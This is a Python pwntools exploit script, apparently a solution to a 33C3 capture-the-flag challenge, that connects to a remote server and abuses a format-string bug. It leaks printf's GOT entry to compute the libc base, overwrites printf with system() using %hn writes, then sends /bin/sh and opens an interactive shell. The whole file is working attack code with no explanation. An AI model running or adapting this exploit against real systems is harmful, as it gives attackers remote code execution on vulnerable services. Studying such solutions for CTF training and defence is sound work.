#!/usr/bin/python
# $ cat flag
# 33C3_f1rst_tshirt_challenge?!

from pwn import *
import struct
buf = ""

s = remote("78.46.224.86", 1337)

main = 0x400490

# dump printf_got
buf = "%7$s" + "A" * 4 + struct.pack("<Q", 0x601018)
print repr(buf)

s.send(buf + "\n")
tmp = s.recv().split("A")[0]
tmp += "\x00" * 2
libc_printf = struct.unpack("<Q",tmp)[0]
print hex(libc_printf)
libc_base = libc_printf - 0x0000000000056550
off_system = libc_base + 0x00000000000456d0

print "LIBC BASE: " + hex(libc_base)
print "LIBC SYSTEM: " + hex(off_system)
print "LIBC PRINTF: " + hex(libc_printf)

print "FIRST " + hex(off_system & 0xffff)
print "SECOND " + hex((off_system >> 16) & 0xFFFF)

first = off_system & 0xFFFF
second = ((off_system >> 16) & 0xFFFF) - first
if(second < first):
    second += 0x10000
#debug
buf = "%7$s" + "A" * 4 + struct.pack("<Q", libc_base)
s.send(buf + "\n")
print s.recv()

print "ON WE GO, OVERWRITING PRINTF WITH SYSTEM()"
#lol
buf = "%" + str(first) +"c%10$hn%" + str(second) + "c%11$hn" + "Z" * (6 + abs(len(str(first)) - len(str(second))))  + struct.pack("<Q", 0x601018) + struct.pack("<Q",0x60101a)

s.send(buf + "\n")
s.recv()
s.send("/bin/sh" + "\x00" + "\n")
s.interactive()

